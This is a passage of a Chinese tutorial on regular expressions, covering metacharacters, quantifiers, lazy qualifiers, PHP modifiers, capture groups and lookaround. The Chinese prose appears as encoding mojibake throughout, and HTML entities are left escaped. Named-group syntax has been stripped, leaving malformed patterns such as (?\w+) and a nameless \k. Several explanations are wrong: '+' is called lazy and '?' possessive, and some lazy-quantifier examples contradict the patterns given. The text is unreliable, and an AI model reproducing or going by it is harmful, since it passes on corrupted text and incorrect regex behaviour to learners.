·çš„ç‰¹æ®Šç¬¦å·ï¼Œå®Œå…¨ä¸çŸ¥æ‰€äº‘ã€‚\nå…¶å®åªæ˜¯å¯¹æ­£åˆ™ä¸äº†è§£è€Œä»¥ï¼Œäº†è§£äº†ä½ å°±ä¼šå‘ç°ï¼ŒåŸæ¥å°±è¿™æ ·å•Šæ­£åˆ™æ‰€ç”¨çš„ç›¸å…³å­—ç¬¦å…¶å®ä¸å¤šï¼Œä¹Ÿä¸éš¾è®°ï¼Œæ›´ä¸éš¾æ‡‚ï¼Œå”¯ä¸€éš¾çš„å°±æ˜¯ç»„åˆèµ·æ¥ä¹‹åï¼Œå¯è¯»æ€§æ¯”è¾ƒå·®ï¼Œè€Œä¸”ä¸å®¹æ˜“ç†è§£ï¼Œæœ¬æ–‡æ—¨åœ¨è®©å¤§å®¶å¯¹æ­£åˆ™æœ‰ä¸€ä¸ªåŸºæœ¬çš„äº†è§£ï¼Œèƒ½çœ‹å¾—æ‡‚ç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå†™å¾—å‡ºç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨ä»¥æ»¡è¶³æ—¥å¸¸å¼€å‘ä¸­çš„éœ€æ±‚å³å¯ã€‚\n0\\d{2}-\\d{8}|0\\d{3}-\\d{7} å…ˆæ¥ä¸€æ®µæ­£åˆ™ï¼Œå¦‚æœä½ å¯¹æ­£åˆ™ä¸äº†è§£ï¼Œæ˜¯ä¸æ˜¯å®Œå…¨ä¸çŸ¥é“è¿™ä¸€ä¸²å­—ç¬¦æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿè¿™ä¸è¦ç´§æ–‡ç« ä¼šè¯¦ç»†è§£é‡Šæ¯ä¸ªå­—ç¬¦çš„å«ä¹‰çš„ã€‚\n1.1 ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼\næ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§ç‰¹æ®Šçš„å­—ç¬¦ä¸²æ¨¡å¼ï¼Œç”¨äºåŒ¹é…ä¸€ç»„å­—ç¬¦ä¸²ï¼Œå°±å¥½æ¯”ç”¨æ¨¡å…·åšäº§å“ï¼Œè€Œæ­£åˆ™å°±æ˜¯è¿™ä¸ªæ¨¡å…·ï¼Œå®šä¹‰ä¸€ç§è§„åˆ™å»åŒ¹é…ç¬¦åˆè§„åˆ™çš„å­—ç¬¦ã€‚\n1.2 å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…å·¥å…·\nåœ¨çº¿åŒ¹é…å·¥å…·ï¼š\nã€€1 http://www.regexpal.com/\n2 http://rubular.com/\näºŒ ã€æ­£åˆ™å­—ç¬¦ç®€å•ä»‹ç» 2.1 å…ƒå­—ç¬¦ä»‹ç»\n\u0026quot;^\u0026quot; ï¼š^ä¼šåŒ¹é…è¡Œæˆ–è€…å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼Œæœ‰æ—¶è¿˜ä¼šåŒ¹é…æ•´ä¸ªæ–‡æ¡£çš„èµ·å§‹ä½ç½®ã€‚\n\u0026quot;$\u0026quot; ï¼š$ä¼šåŒ¹é…è¡Œæˆ–å­—ç¬¦ä¸²çš„ç»“å°¾\nå¦‚å›¾\nâ€‹ è€Œä¸”è¢«åŒ¹é…çš„å­—ç¬¦å¿…é¡»æ˜¯ä»¥Thiså¼€å¤´æœ‰ç©ºæ ¼ä¹Ÿä¸è¡Œï¼Œå¿…é¡»ä»¥Regexç»“å°¾ï¼Œä¹Ÿä¸èƒ½æœ‰ç©ºæ ¼ä¸å…¶å®ƒå­—ç¬¦\n\u0026quot;\\b\u0026quot; :ä¸ä¼šæ¶ˆè€—ä»»ä½•å­—ç¬¦åªåŒ¹é…ä¸€ä¸ªä½ç½®ï¼Œå¸¸ç”¨äºåŒ¹é…å•è¯è¾¹ç•Œ å¦‚ æˆ‘æƒ³ä»å­—ç¬¦ä¸²ä¸­\u0026quot;This is Regex\u0026quot;åŒ¹é…å•ç‹¬çš„å•è¯ \u0026ldquo;is\u0026rdquo; æ­£åˆ™å°±è¦å†™æˆ \u0026ldquo;\\bis\\b\u0026rdquo;\nã€€\\b ä¸ä¼šåŒ¹é…is ä¸¤è¾¹çš„å­—ç¬¦ï¼Œä½†å®ƒä¼šè¯†åˆ«is ä¸¤è¾¹æ˜¯å¦ä¸ºå•è¯çš„è¾¹ç•Œ\n\u0026quot;\\d\u0026quot;: åŒ¹é…æ•°å­—ï¼Œ\nã€€ä¾‹å¦‚è¦åŒ¹é…ä¸€ä¸ªå›ºå®šæ ¼å¼çš„ç”µè¯å·ç ä»¥0å¼€å¤´å‰4ä½å7ä½ï¼Œå¦‚0737-5686123 æ­£åˆ™:^0\\d\\d\\d-\\d\\d\\d\\d\\d\\d\\d$ è¿™é‡Œåªæ˜¯ä¸ºäº†ä»‹ç»\u0026quot;\\d\u0026quot;å­—ç¬¦ï¼Œå®é™…ä¸Šæœ‰æ›´å¥½çš„å†™æ³•ä¼šåœ¨ ä¸‹é¢ä»‹ç»ã€‚\n\u0026quot;\\w\u0026quot;ï¼šåŒ¹é…å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿.\nã€€ä¾‹å¦‚æˆ‘è¦åŒ¹é…\u0026quot;a2345BCD__TTz\u0026quot; æ­£åˆ™ï¼š\u0026quot;\\w+\u0026quot; è¿™é‡Œçš„\u0026quot;+\u0026ldquo;å­—ç¬¦ä¸ºä¸€ä¸ªé‡è¯æŒ‡é‡å¤çš„æ¬¡æ•°ï¼Œç¨åä¼šè¯¦ç»†ä»‹ç»ã€‚\n\u0026quot;\\s\u0026rdquo;ï¼šåŒ¹é…ç©ºæ ¼\nã€€ä¾‹å¦‚å­—ç¬¦ \u0026ldquo;a b c\u0026rdquo; æ­£åˆ™ï¼š\u0026quot;\\w\\s\\w\\s\\w\u0026quot; ä¸€ä¸ªå­—ç¬¦åè·Ÿä¸€ä¸ªç©ºæ ¼ï¼Œå¦‚æœ‰å­—ç¬¦é—´æœ‰å¤šä¸ªç©ºæ ¼ç›´æ¥æŠŠ\u0026quot;\\s\u0026quot; å†™æˆ \u0026ldquo;\\s+\u0026rdquo; è®©ç©ºæ ¼é‡å¤\n\u0026quot;.\u0026quot;ï¼šåŒ¹é…é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•å­—ç¬¦\nã€€è¿™ä¸ªç®—æ˜¯\u0026quot;\\w\u0026quot;çš„åŠ å¼ºç‰ˆäº†\u0026quot;\\w\u0026quot;ä¸èƒ½åŒ¹é… ç©ºæ ¼ å¦‚æœæŠŠå­—ç¬¦ä¸²åŠ ä¸Šç©ºæ ¼ç”¨\u0026quot;\\w\u0026quot;å°±å—é™äº†ï¼Œçœ‹ä¸‹ç”¨ \u0026ldquo;.\u0026ldquo;æ˜¯å¦‚ä½•åŒ¹é…å­—ç¬¦\u0026quot;a23 4 5 B C D__TTz\u0026rdquo; æ­£åˆ™ï¼š\u0026rdquo;.+\u0026quot;\n\u0026quot;[abc]\u0026quot;: å­—ç¬¦ç»„ åŒ¹é…åŒ…å«æ‹¬å·å†…å…ƒç´ çš„å­—ç¬¦\nâ€‹ è¿™ä¸ªæ¯”è¾ƒç®€å•äº†åªåŒ¹é…æ‹¬å·å†…å­˜åœ¨çš„å­—ç¬¦ï¼Œè¿˜å¯ä»¥å†™æˆ[a-z]åŒ¹é…aè‡³zçš„æ‰€ä»¥å­—æ¯å°±ç­‰äºå¯ä»¥ç”¨æ¥æ§åˆ¶åªèƒ½è¾“å…¥è‹±æ–‡äº†ï¼Œ\n2.2 å‡ ç§åä¹‰\nã€€å†™æ³•å¾ˆç®€å•æ”¹æˆå¤§å†™å°±è¡Œäº†ï¼Œæ„æ€ä¸åŸæ¥çš„ç›¸åï¼Œè¿™é‡Œå°±ä¸ä¸¾ä¾‹å­äº†\n\u0026quot;****\\W\u0026quot; åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ çš„å­—ç¬¦\n\u0026quot;\\S\u0026quot; åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦\nã€€\u0026quot;\\D\u0026quot; åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦\n\u0026quot;\\B\u0026quot; åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–ç»“æŸçš„ä½ç½®\n\u0026quot;[^abc]\u0026quot; åŒ¹é…é™¤äº†abcä»¥å¤–çš„ä»»æ„å­—ç¬¦\n2.3 é‡è¯\nã€€å…ˆè§£é‡Šå…³äºé‡è¯æ‰€æ¶‰åŠåˆ°çš„é‡è¦çš„ä¸‰ä¸ªæ¦‚å¿µ\nè´ªå©ª(è´ªå¿ƒ) å¦‚\u0026quot;*\u0026ldquo;å­—ç¬¦ è´ªå©ªé‡è¯ä¼šé¦–å…ˆåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œå°è¯•åŒ¹é…æ—¶ï¼Œå®ƒä¼šé€‰å®šå°½å¯èƒ½å¤šçš„å†…å®¹ï¼Œå¦‚æœ å¤±è´¥åˆ™å›é€€ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åå†æ¬¡å°è¯•å›é€€çš„è¿‡ç¨‹å°±å«åšå›æº¯ï¼Œå®ƒä¼šæ¯æ¬¡å›é€€ä¸€ä¸ªå­—ç¬¦ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…çš„å†…å®¹æˆ–è€…æ²¡æœ‰å­—ç¬¦å¯ä»¥å›é€€ã€‚ç›¸æ¯”ä¸‹é¢ä¸¤ç§è´ªå©ªé‡è¯å¯¹èµ„æºçš„æ¶ˆè€—æ˜¯æœ€å¤§çš„ï¼Œ\næ‡’æƒ°(å‹‰å¼º) å¦‚ \u0026ldquo;?\u0026rdquo; æ‡’æƒ°é‡è¯ä½¿ç”¨å¦ä¸€ç§æ–¹å¼åŒ¹é…ï¼Œå®ƒä»ç›®æ ‡çš„èµ·å§‹ä½ç½®å¼€å§‹å°è¯•åŒ¹é…ï¼Œæ¯æ¬¡æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶å¯»æ‰¾å®ƒè¦åŒ¹é…çš„å†…å®¹ï¼Œå¦‚æ­¤å¾ªç¯ç›´åˆ°å­—ç¬¦ç»“å°¾å¤„ã€‚\nå æœ‰ å¦‚\u0026rdquo;+\u0026quot; å æœ‰é‡è¯ä¼šè¦†ç›–äº‹ä¸ªç›®æ ‡å­—ç¬¦ä¸²ï¼Œç„¶åå°è¯•å¯»æ‰¾åŒ¹é…å†…å®¹ ï¼Œä½†å®ƒåªå°è¯•ä¸€æ¬¡ï¼Œä¸ä¼šå›æº¯ï¼Œå°±å¥½æ¯”å…ˆæŠ“ä¸€æŠŠçŸ³å¤´ï¼Œç„¶åä»çŸ³å¤´ä¸­æŒ‘å‡ºé»„é‡‘\n\u0026quot;*\u0026quot;(è´ªå©ª) é‡å¤é›¶æ¬¡æˆ–æ›´å¤š\nã€€ä¾‹å¦‚\u0026quot;aaaaaaaa\u0026quot; åŒ¹é…å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„a æ­£åˆ™ï¼š \u0026ldquo;a*\u0026rdquo; ä¼šå‡ºåˆ°æ‰€æœ‰çš„å­—ç¬¦\u0026quot;a\u0026quot;\n\u0026quot;+\u0026quot;(æ‡’æƒ°) é‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡\nã€€ä¾‹å¦‚\u0026quot;aaaaaaaa\u0026quot; åŒ¹é…å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„a æ­£åˆ™ï¼š \u0026ldquo;a+\u0026rdquo; ä¼šå–åˆ°å­—ç¬¦ä¸­æ‰€æœ‰çš„aå­—ç¬¦ï¼Œ \u0026ldquo;a+\u0026ldquo;ä¸\u0026quot;a*\u0026ldquo;ä¸åŒåœ¨äº\u0026rdquo;+\u0026ldquo;è‡³å°‘æ˜¯ä¸€æ¬¡è€Œ\u0026rdquo;*\u0026rdquo; å¯ä»¥æ˜¯0æ¬¡ï¼Œ\nã€€ç¨åä¼šä¸\u0026rdquo;?\u0026ldquo;å­—ç¬¦ç»“åˆæ¥ä½“ç°è¿™ç§åŒºåˆ«\n\u0026rdquo;?\u0026quot;(å æœ‰) é‡å¤é›¶æ¬¡æˆ–ä¸€æ¬¡\nã€€ä¾‹å¦‚\u0026quot;aaaaaaaa\u0026quot; åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„a æ­£åˆ™ ï¼š \u0026ldquo;a?\u0026rdquo; åªä¼šåŒ¹é…ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯ç»“æœåªæ˜¯å•ä¸ªå­—ç¬¦a\nã€€\u0026quot;{n}\u0026quot; é‡å¤næ¬¡\nã€€ä¾‹å¦‚ä»\u0026quot;aaaaaaaa\u0026quot; åŒ¹é…å­—ç¬¦ä¸²çš„a å¹¶é‡å¤3æ¬¡ æ­£åˆ™ï¼š \u0026ldquo;a{3}\u0026rdquo; ç»“æœå°±æ˜¯å–åˆ°3ä¸ªaå­—ç¬¦ \u0026ldquo;aaa\u0026rdquo;;\nã€€\u0026quot;{n,m}\u0026quot; é‡å¤nåˆ°mæ¬¡\nã€€ä¾‹å¦‚æ­£åˆ™ \u0026ldquo;a{3,4}\u0026rdquo; å°†aé‡å¤åŒ¹é…3æ¬¡æˆ–è€…4æ¬¡ æ‰€ä»¥ä¾›åŒ¹é…çš„å­—ç¬¦å¯ä»¥æ˜¯ä¸‰ä¸ª\u0026quot;aaa\u0026quot;ä¹Ÿå¯ä»¥æ˜¯å››ä¸ª\u0026quot;aaaa\u0026quot; æ­£åˆ™éƒ½å¯ä»¥åŒ¹é…åˆ°\n\u0026quot;{n,}\u0026quot; é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡\nã€€ä¸{n,m}ä¸åŒä¹‹å¤„å°±åœ¨äºåŒ¹é…çš„æ¬¡æ•°å°†æ²¡æœ‰ä¸Šé™ï¼Œä½†è‡³å°‘è¦é‡å¤næ¬¡ å¦‚ æ­£åˆ™\u0026quot;a{3,}\u0026quot; aè‡³å°‘è¦é‡å¤3æ¬¡\næŠŠé‡è¯äº†è§£äº†ä¹‹åä¹‹å‰åŒ¹é…ç”µè¯å·ç çš„æ­£åˆ™ç°åœ¨å°±å¯ä»¥æ”¹å¾—ç®€å•ç‚¹äº†^0\\d\\d\\d-\\d\\d\\d\\d\\d\\d\\d$ å¯ä»¥æ”¹ä¸º\u0026quot;^0\\d+-\\d{7}$\u0026quot;ã€‚\nè¿™æ ·å†™è¿˜ä¸å¤Ÿå®Œç¾å¦‚æœå› ä¸ºå‰é¢çš„åŒºå·æ²¡æœ‰åšé™å®šï¼Œä»¥è‡³äºå¯ä»¥è¾“å…¥å¾ˆå¤šä»¬ï¼Œè€Œé€šå¸¸åªèƒ½æ˜¯3ä½æˆ–è€…4ä½ï¼Œ\nç°åœ¨å†æ”¹ä¸€ä¸‹ \u0026ldquo;^0\\d{2,3}-\\d{7}\u0026ldquo;å¦‚æ­¤ä¸€æ¥åŒºå·éƒ¨åˆ†å°±å¯ä»¥åŒ¹é…3ä½æˆ–è€…4ä½çš„äº†\n2.4 æ‡’æƒ°é™å®šç¬¦\nã€€\u0026quot;*?\u0026quot; é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤\nã€€å¦‚ \u0026ldquo;acbacb\u0026rdquo; æ­£åˆ™ \u0026ldquo;a.*?b\u0026rdquo; åªä¼šå–åˆ°ç¬¬ä¸€ä¸ª\u0026quot;acb\u0026rdquo; åŸæœ¬å¯ä»¥å…¨éƒ¨å–åˆ°ä½†åŠ äº†é™å®šç¬¦åï¼Œåªä¼šåŒ¹é…å°½å¯èƒ½å°‘çš„å­—ç¬¦ ï¼Œè€Œ\u0026quot;acbacb\u0026quot;æœ€å°‘å­—ç¬¦çš„ç»“æœå°±æ˜¯\u0026quot;acb\u0026rdquo;\nã€€\u0026quot;+?\u0026quot; é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤\nã€€ä¸ä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯è‡³å°‘è¦é‡å¤1æ¬¡\nã€€\u0026quot;??\u0026quot; é‡å¤0æ¬¡æˆ–1æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤\nã€€å¦‚ \u0026ldquo;aaacb\u0026rdquo; æ­£åˆ™ \u0026ldquo;a.??b\u0026rdquo; åªä¼šå–åˆ°æœ€åçš„ä¸‰ä¸ªå­—ç¬¦\u0026quot;acb\u0026quot;\nã€€\u0026quot;{n,m}?\u0026quot; é‡å¤nåˆ°mæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤\nâ€‹ å¦‚ \u0026ldquo;aaaaaaaa\u0026rdquo; æ­£åˆ™ \u0026ldquo;a{0,m}\u0026rdquo; å› ä¸ºæœ€å°‘æ˜¯0æ¬¡æ‰€ä»¥å–åˆ°ç»“æœä¸ºç©º\nã€€\u0026quot;{n,}?\u0026quot; é‡å¤næ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤\nâ€‹ å¦‚ \u0026ldquo;aaaaaaa\u0026rdquo; æ­£åˆ™ \u0026ldquo;a{1,}\u0026rdquo; æœ€å°‘æ˜¯1æ¬¡æ‰€ä»¥å–åˆ°ç»“æœä¸º \u0026ldquo;a\u0026rdquo;\nä¿®é¥°ç¬¦ï¼š i ï¼šå¦‚æœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Š\u0026quot;i\u0026quot;ï¼Œåˆ™æ­£åˆ™å°†ä¼šå–æ¶ˆå¤§å°å†™æ•æ„Ÿæ€§ï¼Œå³\u0026quot;a\u0026quot;å’Œ\u0026quot;A\u0026quot; æ˜¯ä¸€æ ·çš„ã€‚ mï¼šé»˜è®¤çš„æ­£åˆ™å¼€å§‹\u0026quot;^\u0026ldquo;å’Œç»“æŸ\u0026rdquo;$\u0026ldquo;åªæ˜¯å¯¹äºæ­£åˆ™å­—ç¬¦ä¸²å¦‚æœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Š\u0026quot;m\u0026rdquo;ï¼Œé‚£ä¹ˆå¼€å§‹å’Œç»“æŸå°†ä¼šæŒ‡å­—ç¬¦ä¸²çš„æ¯ä¸€è¡Œï¼šæ¯ä¸€è¡Œçš„å¼€å¤´å°±æ˜¯\u0026quot;^\u0026quot;ï¼Œç»“å°¾å°±æ˜¯\u0026quot;$\u0026quot;ã€‚ sï¼šå¦‚æœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ å…¥\u0026quot;s\u0026quot;ï¼Œé‚£ä¹ˆé»˜è®¤çš„\u0026quot;.\u0026ldquo;ä»£è¡¨é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•å­—ç¬¦å°†ä¼šå˜æˆä»»æ„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯åŒ…æ‹¬æ¢è¡Œç¬¦ï¼ xï¼šå¦‚æœåŠ ä¸Šè¯¥ä¿®é¥°ç¬¦ï¼Œè¡¨è¾¾å¼ä¸­çš„ç©ºç™½å­—ç¬¦å°†ä¼šè¢«å¿½ç•¥ï¼Œé™¤éå®ƒå·²ç»è¢«è½¬ä¹‰ã€‚ eï¼šæœ¬ä¿®é¥°ç¬¦ä»…ä»…å¯¹äºreplacementæœ‰ç”¨ï¼Œä»£è¡¨åœ¨replacementä¸­ä½œä¸ºPHPä»£ç ã€‚ Aï¼šå¦‚æœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼å¿…é¡»æ˜¯åŒ¹é…çš„å­—ç¬¦ä¸²ä¸­çš„å¼€å¤´éƒ¨åˆ†ã€‚æ¯”å¦‚è¯´\u0026rdquo;/a/A\u0026quot;åŒ¹é…\u0026quot;abcd\u0026quot;ã€‚ Eï¼šä¸\u0026quot;m\u0026quot;ç›¸åï¼Œå¦‚æœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆ\u0026quot;$\u0026ldquo;å°†åŒ¹é…ç»å¯¹å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œè€Œä¸æ˜¯æ¢è¡Œç¬¦å‰é¢ï¼Œé»˜è®¤å°±æ‰“å¼€äº†è¿™ä¸ªæ¨¡å¼ã€‚ Uï¼šå’Œé—®å·çš„ä½œç”¨å·®ä¸å¤šï¼Œç”¨äºè®¾ç½®\u0026quot;è´ªå©ªæ¨¡å¼\u0026rdquo;ã€‚\næ­£åˆ™è¡¨è¾¾å¼ä¸­å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦æœ‰iã€gã€mã€sã€xã€eç­‰ã€‚å®ƒä»¬ä¹‹é—´å¯ä»¥ç»„åˆæ­é…ä½¿ç”¨ã€‚\nå®ƒä»¬çš„ä½œç”¨å¦‚ä¸‹ï¼š\n//ä¿®æ­£ç¬¦:i ä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é…;\n//å¦‚:\u0026quot;/abc/i\u0026quot;å¯ä»¥ä¸abcæˆ–aBCæˆ–ABcç­‰åŒ¹é…;\n//ä¿®æ­£ç¬¦ï¼šgè¡¨ç¤ºå…¨å±€åŒ¹é…\n//ä¿®æ­£ç¬¦:m å°†å­—ç¬¦ä¸²è§†ä¸ºå¤šè¡Œ,ä¸ç®¡æ˜¯é‚£è¡Œéƒ½èƒ½åŒ¹é…;\nä¾‹://æ¨¡å¼ä¸º:$mode=\u0026quot;/abc/m\u0026quot;; //è¦åŒ¹é…çš„å­—ç¬¦ä¸²ä¸º:$str=\u0026ldquo;bcefg5e\\nabcdfe\u0026rdquo; //æ³¨æ„å…¶ä¸­\\n,æ¢è¡Œäº†;abcæ¢åˆ°äº†ä¸‹ä¸€è¡Œ; //$strå’Œ$modeä»å¯ä»¥åŒ¹é…,ä¿®æ­£ç¬¦mä½¿å¾—å¤šè¡Œä¹Ÿå¯åŒ¹é…; //ä¿®æ­£ç¬¦:s å°†å­—ç¬¦ä¸²è§†ä¸ºå•è¡Œ,æ¢è¡Œç¬¦ä½œä¸ºæ™®é€šå­—ç¬¦;\nä¾‹://æ¨¡å¼ä¸º:$mode=\u0026quot;/pr.y/\u0026quot;; //è¦åŒ¹é…å­—ç¬¦ä¸²ä¸º:$str=\u0026ldquo;pr\\ny\u0026rdquo;; //ä¸¤è€…ä¸å¯åŒ¹é…; . æ˜¯é™¤äº†æ¢è¡Œä»¥å¤–çš„å­—ç¬¦å¯åŒ¹é…; //ä¿®æ”¹ä¸‹æ¨¡å¼ä¸º:$mode=\u0026quot;/pr.y/s\u0026quot;; //å…¶ä¸­ä¿®æ­£ç¬¦så°†\\nè§†ä¸ºæ™®é€šå­—ç¬¦,å³ä¸æ˜¯æ¢è¡Œ; //æœ€åä¸¤è€…å¯ä»¥åŒ¹é…; //ä¿®æ­£ç¬¦:x å°†æ¨¡å¼ä¸­çš„ç©ºç™½å¿½ç•¥; //ä¿®æ­£ç¬¦:A å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;\nä¾‹://$mode=\u0026quot;/abc/A\u0026quot;; //å¯ä»¥ä¸$str=\u0026ldquo;abcsdfi\u0026quot;åŒ¹é…, //ä¸å¯ä»¥ä¸$str2=\u0026ldquo;sdsdabc\u0026quot;åŒ¹é…; //å› ä¸º$str2ä¸æ˜¯ä»¥abcå¼€å¤´; //ä¿®æ­£ç¬¦:D å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ;\nä¾‹://æ¨¡å¼ä¸º:$mode=\u0026quot;/abc$/\u0026quot;; //å¯ä»¥ä¸æœ€åæœ‰æ¢è¡Œçš„$str=\u0026ldquo;adshabc\\n\u0026quot;åŒ¹é…; //å…ƒå­ç¬¦$ä¼šå¿½ç•¥æœ€åçš„æ¢è¡Œ\\n; //å¦‚æœæ¨¡å¼ä¸º:$mode=\u0026quot;/abc/D\u0026rdquo;, //åˆ™ä¸èƒ½ä¸$str=\u0026ldquo;adshabc\\n\u0026quot;åŒ¹é…, //ä¿®æ­£ç¬¦Dé™åˆ¶å…¶ä¸å¯æœ‰æ¢è¡Œ;å¿…éœ€ä»¥abcç»“å°¾; //ä¿®æ­£ç¬¦:U åªåŒ¹é…æœ€è¿‘çš„ä¸€ä¸ªå­—ç¬¦ä¸²;ä¸é‡å¤åŒ¹é…;\nä¾‹: å¦‚æ¨¡å¼ä¸º: $mode=\u0026quot;/a.*c/\u0026quot;; $str=\u0026ldquo;abcabbbcabbbbbc\u0026rdquo; ; preg_match($mode,$str,$content); echo $content[0]; //è¾“å‡º:abcabbbcabbbbbc;\n//å¦‚æœ$mode=\u0026quot;/a.*c/\u0026quot;;å˜æˆ$mode=\u0026quot;/a.*c/U\u0026rdquo;; // åˆ™åªåŒ¹é…æœ€è¿‘ä¸€ä¸ªå­—ç¬¦ä¸²,è¾“å‡º:abc;\n//ä¿®æ­£ç¬¦:e é…åˆå‡½æ•°preg_replace()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ;\nä¸‰ ã€ æ­£åˆ™è¿›é˜¶ 3.1 æ•è·åˆ†ç»„\nã€€å…ˆäº†è§£åœ¨æ­£åˆ™ä¸­æ•è·åˆ†ç»„çš„æ¦‚å¿µï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ‹¬å·å†…çš„å†…å®¹ å¦‚ \u0026ldquo;(\\d)\\d\u0026rdquo; è€Œ\u0026rdquo;(\\d)\u0026rdquo; è¿™å°±æ˜¯ä¸€ä¸ªæ•è·åˆ†ç»„ï¼Œå¯ä»¥å¯¹æ•è·åˆ†ç»„è¿›è¡Œ åå‘å¼•ç”¨ (å¦‚æœåè€Œæœ‰ç›¸åŒçš„å†…å®¹åˆ™å¯ä»¥ç›´æ¥å¼•ç”¨å‰é¢å®šä¹‰çš„æ•è·ç»„ï¼Œä»¥ç®€åŒ–è¡¨è¾¾å¼) å¦‚(\\d)\\d\\1 è¿™é‡Œçš„\u0026quot;\\1\u0026quot;å°±æ˜¯å¯¹\u0026quot;(\\d)\u0026ldquo;çš„åå‘å¼•ç”¨\né‚£æ•è·åˆ†ç»„æœ‰ä»€ä¹ˆç”¨å‘¢çœ‹ä¸ªä¾‹å­å°±çŸ¥é“äº†\nå¦‚ \u0026ldquo;zery zery\u0026rdquo; æ­£åˆ™ \\b(\\w+)\\b\\s\\1\\b æ‰€ä»¥è¿™é‡Œçš„\u0026rdquo;\\1\u0026quot;æ‰€æ•è·åˆ°çš„å­—ç¬¦ä¹Ÿæ˜¯ ä¸(\\w+)ä¸€æ ·çš„\u0026quot;zery\u0026quot;ï¼Œä¸ºäº†è®©ç»„åæ›´æœ‰æ„ä¹‰ï¼Œç»„åæ˜¯å¯ä»¥è‡ªå®šä¹‰åå­—çš„\n\u0026ldquo;\\b(?\\w+)\\b\\s\\k\\b\u0026rdquo; ç”¨\u0026quot;?\u0026ldquo;å°±å¯ä»¥è‡ªå®šä¹‰ç»„åäº†è€Œè¦åå‘å¼•ç”¨ç»„æ—¶è¦è®°å¾—å†™æˆ \u0026ldquo;\\k\u0026quot;;è‡ªå®šä¹‰ç»„åå,æ•è·ç»„ä¸­åŒ¹é…åˆ°çš„å€¼å°±ä¼šä¿å­˜åœ¨å®šä¹‰çš„ç»„åé‡Œ\nä¸‹é¢åˆ—å‡ºæ•è·åˆ†ç»„å¸¸æœ‰çš„ç”¨æ³•\n\u0026quot;(exp)\u0026quot; åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°è‡ªåŠ¨å‘½åçš„ç»„é‡Œ\n\u0026quot;(?exp)\u0026quot; åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°åç§°ä¸ºnameçš„ç»„é‡Œ\n\u0026quot;(?:exp)\u0026quot; åŒ¹é…exp,ä¸æ•è·åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿä¸ç»™æ­¤åˆ†ç»„åˆ†é…ç»„å·\nä»¥ä¸‹ä¸ºé›¶å®½æ–­è¨€\n\u0026quot;(?=exp)\u0026quot; åŒ¹é…expå‰é¢çš„ä½ç½®\nã€€å¦‚ \u0026ldquo;How are you doing\u0026rdquo; æ­£åˆ™\u0026rdquo;(?.+(?=ing))\u0026rdquo; è¿™é‡Œå–ingå‰æ‰€æœ‰çš„å­—ç¬¦ï¼Œå¹¶å®šä¹‰äº†ä¸€ä¸ªæ•è·åˆ†ç»„åå­—ä¸º \u0026ldquo;txt\u0026rdquo; è€Œ\u0026quot;txt\u0026quot;è¿™ä¸ªç»„é‡Œçš„å€¼ä¸º\u0026quot;How are you do\u0026quot;;\n\u0026quot;(?\u0026lt;=exp)\u0026quot; åŒ¹é…expåé¢çš„ä½ç½®\nã€€å¦‚ \u0026ldquo;How are you doing\u0026rdquo; æ­£åˆ™\u0026quot;(?(?\u0026lt;=How).+)\u0026quot; è¿™é‡Œå–\u0026quot;How\u0026quot;ä¹‹åæ‰€æœ‰çš„å­—ç¬¦ï¼Œå¹¶å®šä¹‰äº†ä¸€ä¸ªæ•è·åˆ†ç»„åå­—ä¸º \u0026ldquo;txt\u0026rdquo; 